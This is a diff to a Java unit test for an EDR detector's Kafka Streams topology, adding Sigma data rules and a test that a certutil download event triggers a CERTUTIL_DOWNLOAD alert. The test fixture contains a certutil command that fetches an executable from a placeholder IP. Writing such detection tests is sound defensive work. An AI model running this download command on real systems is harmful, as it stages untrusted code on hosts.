@@ -1,6 +1,8 @@
 package com.edrdog.detectorservice.kafkastreams.topology;
 
 import com.edrdog.detectorservice.dto.Alert;
+import com.edrdog.detectorservice.rule.DataRules;
+import com.edrdog.detectorservice.rule.SigmaRule;
 import com.edrdog.detectorservice.support.TestEvents;
 import com.edrdog.schema.Event;
 import com.edrdog.schema.EventSerde;
@@ -19,6 +21,7 @@ import org.junit.jupiter.api.DisplayName;
 import org.junit.jupiter.api.Test;
 
 import java.time.Duration;
+import java.util.List;
 import java.util.Properties;
 
 import static org.assertj.core.api.Assertions.assertThat;
@@ -34,12 +37,14 @@ class DetectionTopologyTest {
     private TestInputTopic<String, Event> events;
     private TestOutputTopic<String, Alert> alerts;
     private MeterRegistry metrics;
+    /** 데이터 룰. 테스트가 바꾸면 다음 판정부터 적용된다(운영의 리로드와 같은 경로). */
+    private List<SigmaRule> dataRules = List.of();
 
     @BeforeEach
     void setUp() {
         StreamsBuilder builder = new StreamsBuilder();
         metrics = new SimpleMeterRegistry();
-        DetectionTopology.build(builder, EVENTS, ALERTS, DetectionTopology.WINDOW_MS, GRACE_MS, metrics);
+        DetectionTopology.build(builder, EVENTS, ALERTS, DetectionTopology.WINDOW_MS, GRACE_MS, metrics, () -> dataRules);
 
         Properties props = new Properties();
         props.put("application.id", "detector-test");
@@ -181,6 +186,27 @@ class DetectionTopologyTest {
 
         assertThat(alerts.getQueueSize()).isEqualTo(1);
         assertThat(alerts.readValue().ruleId()).isEqualTo("DOWNLOAD_AND_EXECUTE");
+    }
+
+    @Test
+    @DisplayName("데이터 룰(Sigma 파일)이 토폴로지를 거쳐 알림이 되고, 룰이 없으면 같은 이벤트도 조용하다")
+    void dataRule_firesThroughTopology() {
+        Event certutil = TestEvents.of("host-7", EventTypes.PROCESS, 1000, "certutil.exe", "cmd.exe",
+                "C:\\Windows\\System32\\certutil.exe -urlcache -f http://203.0.113.9/a.exe a.exe",
+                null, 0, null, null, null, "tenant-a");
+
+        events.pipeInput("k", certutil);
+        assertThat(alerts.getQueueSize()).as("룰이 없을 때").isZero();
+
+        dataRules = new DataRules("").current();   // 번들 룰이 올라온 것과 같다
+        events.pipeInput("k", certutil);
+
+        assertThat(alerts.getQueueSize()).isEqualTo(1);
+        Alert alert = alerts.readValue();
+        assertThat(alert.ruleId()).isEqualTo("CERTUTIL_DOWNLOAD");
+        assertThat(alert.mitre()).isEqualTo("T1105");
+        assertThat(alert.action()).isEqualTo(Alert.ACTION_NOTIFY);
+        assertThat(alertCount("CERTUTIL_DOWNLOAD")).isEqualTo(1);
     }
 
     @Test
